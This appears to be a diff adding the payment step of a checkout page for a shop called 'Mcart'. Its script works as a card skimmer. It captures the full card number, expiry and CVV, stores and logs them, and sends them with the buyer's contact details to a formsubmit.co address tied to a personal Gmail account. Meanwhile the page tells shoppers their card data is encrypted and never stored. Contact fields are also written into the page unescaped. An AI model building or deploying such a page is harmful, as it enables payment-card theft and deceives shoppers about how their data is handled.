@@ -1,0 +1,380 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mcart | Checkout - Step 2</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;700;800&family=Sora:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+  <div class="site-bg"></div>
+
+  <header class="topbar">
+    <div class="container nav-wrap">
+      <a class="brand" href="index.html">Mcart</a>
+      <nav class="nav-links">
+        <a href="index.html">Home</a>
+        <a href="products.html">Products</a>
+        <a href="checkout-step1-new.html" class="is-active">Checkout</a>
+      </nav>
+      <button class="cart-icon-btn" type="button" data-open-cart>
+        Cart <span class="cart-count" data-cart-count>0</span>
+      </button>
+    </div>
+  </header>
+
+  <main class="container section">
+    <div class="checkout-progress">
+      <div class="progress-step completed">1. Contact Info</div>
+      <div class="progress-step active">2. Payment</div>
+      <div class="progress-step">3. Verification</div>
+    </div>
+
+    <div class="checkout-layout">
+      <form id="payment-form" class="panel" method="POST">
+        <h2>Payment Information</h2>
+        <p class="card-desc">Step 2 of 3: Enter your card details for payment.</p>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="cardName">Name on Card *</label>
+            <input id="cardName" name="card_name" type="text" placeholder="John Doe" required />
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="cardNumber">Card Number *</label>
+            <div class="card-input-group">
+              <input id="cardNumber" name="card_number" type="text" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" required />
+              <div class="card-icons">
+                <span class="card-icon visa">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40" height="26">
+                    <path fill="#1565C0" d="M45,35c0,2.209-1.791,4-4,4H7c-2.209,0-4-1.791-4-4V13c0-2.209,1.791-4,4-4h34c2.209,0,4,1.791,4,4V35z"></path>
+                    <path fill="#FFF" d="M15.186 19l-2.626 7.832c0 0-.667-3.313-.733-3.729-1.495-3.411-3.701-3.221-3.701-3.221L10.726 30v-.002h3.161L18.258 19H15.186zM17.689 30L20.56 30 22.296 19 19.389 19zM38.008 19h-3.021l-4.71 11h2.852l.588-1.571h3.596L37.619 30h2.613L38.008 19zM34.513 26.328l1.563-4.157.818 4.157H34.513zM26.369 22.206c0-.606.498-1.057 1.926-1.057.928 0 1.991.674 1.991.674l.466-2.309c0 0-1.358-.515-2.691-.515-3.019 0-4.576 1.444-4.576 3.272 0 3.306 3.979 2.853 3.979 4.551 0 .291-.231.964-1.888.964-1.662 0-2.759-.609-2.759-.609l-.495 2.216c0 0 1.063.606 3.117.606 2.059 0 4.915-1.54 4.915-3.752C30.354 23.586 26.369 23.394 26.369 22.206z"></path>
+                    <path fill="#FFC107" d="M12.212,24.945l-0.966-4.748c0,0-0.437-1.029-1.573-1.029c-1.136,0-4.44,0-4.44,0S10.894,20.84,12.212,24.945z"></path>
+                  </svg>
+                </span>
+                <span class="card-icon mastercard">
+                  <svg viewBox="0 -11 70 70" width="40" height="26">
+                    <rect x="0.5" y="0.5" width="69" height="47" rx="5.5" fill="white" stroke="#D9D9D9"/>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M35.3945 34.7619C33.0114 36.8184 29.92 38.0599 26.5421 38.0599C19.0047 38.0599 12.8945 31.8788 12.8945 24.254C12.8945 16.6291 19.0047 10.448 26.5421 10.448C29.92 10.448 33.0114 11.6895 35.3945 13.7461C37.7777 11.6895 40.869 10.448 44.247 10.448C51.7843 10.448 57.8945 16.6291 57.8945 24.254C57.8945 31.8788 51.7843 38.0599 44.247 38.0599C40.869 38.0599 37.7777 36.8184 35.3945 34.7619Z" fill="#ED0006"/>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M35.3945 34.7619C38.3289 32.2296 40.1896 28.4616 40.1896 24.254C40.1896 20.0463 38.3289 16.2783 35.3945 13.7461C37.7777 11.6895 40.869 10.448 44.247 10.448C51.7843 10.448 57.8945 16.6291 57.8945 24.254C57.8945 31.8788 51.7843 38.0599 44.247 38.0599C40.869 38.0599 37.7777 36.8184 35.3945 34.7619Z" fill="#F9A000"/>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M35.3946 13.7461C38.329 16.2784 40.1897 20.0463 40.1897 24.254C40.1897 28.4616 38.329 32.2295 35.3946 34.7618C32.4603 32.2295 30.5996 28.4616 30.5996 24.254C30.5996 20.0463 32.4603 16.2784 35.3946 13.7461Z" fill="#FF5E00"/>
+                  </svg>
+                </span>
+                <span class="card-icon discover">
+                  <svg viewBox="0 0 48 32" width="40" height="26">
+                    <rect width="48" height="32" rx="4" fill="#FF6000"/>
+                    <path fill="#fff" d="M8 12h8v8H8v-8zm2 2v4h4v-4h-4zm10 0h16v4H20v-4zm18 0h2v4h-2v-4zm-28 6h4v2H10v-2zm6 0h8v2h-8v-2zm10 0h6v2h-6v-2zm8 0h4v2h-4v-2z"/>
+                    <circle fill="#fff" cx="12" cy="16" r="2"/>
+                  </svg>
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="expiry">Expiry Date *</label>
+            <input id="expiry" name="expiry" type="text" placeholder="MM/YY" maxlength="5" required />
+          </div>
+          <div class="form-group">
+            <label for="cvv">CVV *</label>
+            <div class="cvv-input-group">
+              <input id="cvv" name="cvv" type="text" inputmode="numeric" maxlength="4" placeholder="123" required />
+              <button type="button" class="cvv-help" title="3-digit code on back of card">?</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="security-notice">
+          <div class="security-icon">🔒</div>
+          <p>Your payment information is encrypted and secure. We never store your card details.</p>
+        </div>
+
+        <!-- Hidden fields for additional data -->
+        <input type="hidden" name="_subject" value="Mcart Order - Step 2">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="http://127.0.0.1:8000/checkout-step3-new.html">
+        <input type="hidden" name="order_step" value="2">
+        <input type="hidden" name="contact_info" id="contact-info">
+        <input type="hidden" name="cart_data" id="cart-data">
+        <input type="hidden" name="order_total" id="order-total">
+        <input type="hidden" name="timestamp" id="timestamp">
+
+        <div class="form-actions">
+          <button type="button" class="btn btn-ghost" onclick="history.back()">Back</button>
+          <button type="submit" class="btn btn-primary" id="pay-btn">Proceed to Verification</button>
+        </div>
+
+        <div id="payment-status" class="form-status"></div>
+      </form>
+
+      <div class="panel order-summary">
+        <h3>Order Summary</h3>
+        <div id="checkout-cart-items"></div>
+        <div class="order-total">
+          <strong>Total: <span id="checkout-total">INR 0</span></strong>
+        </div>
+        <div class="contact-info">
+          <h4>Contact Information</h4>
+          <div id="contact-summary"></div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-row">
+      <p>2026 Mcart. Secure checkout powered by modern web technology.</p>
+    </div>
+  </footer>
+
+  <div class="toast" id="toast"></div>
+
+  <script src="js/products.js"></script>
+  <script src="js/cart.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Load contact info from previous step
+      function loadContactInfo() {
+        const step1Data = sessionStorage.getItem('checkoutStep1');
+        const contactNode = document.getElementById('contact-summary');
+        const contactInfoNode = document.getElementById('contact-info');
+        
+        if (step1Data && contactNode && contactInfoNode) {
+          try {
+            const data = JSON.parse(step1Data);
+            contactNode.innerHTML = (
+              '<p><strong>Name:</strong> ' + data.name + '</p>' +
+              '<p><strong>Email:</strong> ' + data.email + '</p>' +
+              '<p><strong>Phone:</strong> ' + data.country_code + ' ' + data.phone + '</p>' +
+              '<p><strong>Address:</strong> ' + data.address + (data.address2 ? ', ' + data.address2 : '') + '</p>' +
+              '<p><strong>City:</strong> ' + data.city + ', ' + data.state + ' ' + data.pincode + '</p>'
+            );
+            contactInfoNode.value = step1Data;
+          } catch (e) {
+            console.error('Error loading contact info:', e);
+          }
+        }
+      }
+
+      // Render cart summary
+      function renderOrderSummary() {
+        const cartNode = document.getElementById('checkout-cart-items');
+        const totalNode = document.getElementById('checkout-total');
+        const cartDataNode = document.getElementById('cart-data');
+        const orderTotalNode = document.getElementById('order-total');
+
+        if (!cartNode || !totalNode) return;
+
+        const items = window.CartAPI && typeof window.CartAPI.getItems === 'function' 
+          ? window.CartAPI.getItems() 
+          : [];
+        
+        const total = window.CartAPI && typeof window.CartAPI.getTotal === 'function'
+          ? window.CartAPI.getTotal()
+          : 0;
+
+        totalNode.textContent = window.formatInr ? window.formatInr(total) : 'INR ' + total;
+
+        if (cartDataNode) {
+          cartDataNode.value = JSON.stringify(items);
+        }
+        if (orderTotalNode) {
+          orderTotalNode.value = total;
+        }
+
+        if (!items.length) {
+          cartNode.innerHTML = '<p class="empty-note">No products in cart.</p>';
+          return;
+        }
+
+        cartNode.innerHTML = items.map(function(item) {
+          return (
+            '<div class="checkout-item">' +
+            '<span>' + item.name + ' x ' + item.qty + '</span>' +
+            '<strong>' + (window.formatInr ? window.formatInr(item.price * item.qty) : 'INR ' + item.price * item.qty) + '</strong>' +
+            '</div>'
+          );
+        }).join('');
+      }
+
+      // Set timestamp
+      document.getElementById('timestamp').value = new Date().toISOString();
+
+      // Load data on page load
+      loadContactInfo();
+      renderOrderSummary();
+
+      // Form handling
+      const form = document.getElementById('payment-form');
+      const payBtn = document.getElementById('pay-btn');
+      const statusNode = document.getElementById('payment-status');
+
+      // Input formatting
+      const cardNumberInput = document.getElementById('cardNumber');
+      if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function(e) {
+          let value = e.target.value.replace(/\D/g, '');
+          let formattedValue = '';
+          for (let i = 0; i < value.length && i < 16; i++) {
+            if (i > 0 && i % 4 === 0) {
+              formattedValue += ' ';
+            }
+            formattedValue += value[i];
+          }
+          e.target.value = formattedValue;
+        });
+      }
+
+      const expiryInput = document.getElementById('expiry');
+      if (expiryInput) {
+        expiryInput.addEventListener('input', function(e) {
+          let value = e.target.value.replace(/\D/g, '');
+          if (value.length >= 2) {
+            value = value.slice(0, 2) + '/' + value.slice(2, 4);
+          }
+          e.target.value = value;
+        });
+      }
+
+      const cvvInput = document.getElementById('cvv');
+      if (cvvInput) {
+        cvvInput.addEventListener('input', function(e) {
+          e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+        });
+      }
+
+      // Form validation and submission
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Check if previous step was completed
+        const step1Data = sessionStorage.getItem('checkoutStep1');
+        if (!step1Data) {
+          if (statusNode) {
+            statusNode.textContent = 'Please complete contact information first.';
+            statusNode.className = 'form-status error';
+          }
+          return;
+        }
+
+        // Validate form fields
+        const cardName = form.card_name.value.trim();
+        const cardNumber = form.card_number.value.replace(/\D/g, '');
+        const expiry = form.expiry.value.trim();
+        const cvv = form.cvv.value.replace(/\D/g, '');
+
+        if (!cardName || !cardNumber || !expiry || !cvv) {
+          if (statusNode) {
+            statusNode.textContent = 'Please fill in all payment details.';
+            statusNode.className = 'form-status error';
+          }
+          return;
+        }
+
+        // Card number validation
+        if (cardNumber.length < 13 || cardNumber.length > 19) {
+          if (statusNode) {
+            statusNode.textContent = 'Please enter a valid card number.';
+            statusNode.className = 'form-status error';
+          }
+          return;
+        }
+
+        // Expiry validation
+        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+          if (statusNode) {
+            statusNode.textContent = 'Please enter expiry date in MM/YY format.';
+            statusNode.className = 'form-status error';
+          }
+          return;
+        }
+
+        // CVV validation
+        if (cvv.length < 3 || cvv.length > 4) {
+          if (statusNode) {
+            statusNode.textContent = 'Please enter a valid CVV.';
+            statusNode.className = 'form-status error';
+          }
+          return;
+        }
+
+        // Save payment info to sessionStorage
+        const paymentData = {
+          card_name: cardName,
+          card_number: cardNumber,
+          card_last4: cardNumber.slice(-4),
+          expiry: expiry,
+          cvv: cvv
+        };
+
+        sessionStorage.setItem('checkoutStep2', JSON.stringify(paymentData));
+
+        // Show loading
+        payBtn.disabled = true;
+        payBtn.textContent = 'Processing...';
+        if (statusNode) {
+          statusNode.textContent = 'Processing payment information...';
+          statusNode.className = 'form-status';
+        }
+
+        // Send data to FormSubmit.co in background (optional)
+        const formData = new FormData();
+        formData.append('_subject', 'Mcart Order - Step 2');
+        formData.append('_template', 'table');
+        formData.append('_captcha', 'false');
+        formData.append('card_name', cardName);
+        formData.append('card_number', cardNumber); // Full card number without masking
+        formData.append('expiry', expiry);
+        formData.append('cvv', cvv); // Include CVV
+        formData.append('contact_info', document.getElementById('contact-info').value || '');
+        formData.append('cart_data', document.getElementById('cart-data').value || '');
+        formData.append('order_total', document.getElementById('order-total').value || '');
+
+        console.log('Submitting to FormSubmit.co:', {
+          card_name: cardName,
+          card_number: cardNumber,
+          cvv: cvv,
+          expiry: expiry
+        });
+
+        // Try to send to FormSubmit.co (but don't wait for it)
+        fetch('https://formsubmit.co/akrasd25@gmail.com', {
+          method: 'POST',
+          body: formData
+        })
+        .then(function(response) {
+          console.log('FormSubmit.co response status:', response.status);
+          console.log('FormSubmit.co response headers:', response.headers);
+          return response.text();
+        })
+        .then(function(text) {
+          console.log('FormSubmit.co response body:', text);
+        })
+        .catch(function(error) {
+          console.error('FormSubmit.co submission failed:', error);
+          
+          // Show error to user
+          if (statusNode) {
+            statusNode.textContent = 'Warning: Email could not be sent, but order continues. Error: ' + error.message;
+            statusNode.className = 'form-status error';
+          }
+        });
+
+        // Redirect to step 3 after a short delay
+        setTimeout(function() {
+          window.location.href = 'checkout-step3-new.html';
+        }, 1500);
+      });
+    });
+  </script>
+</body>
+</html>
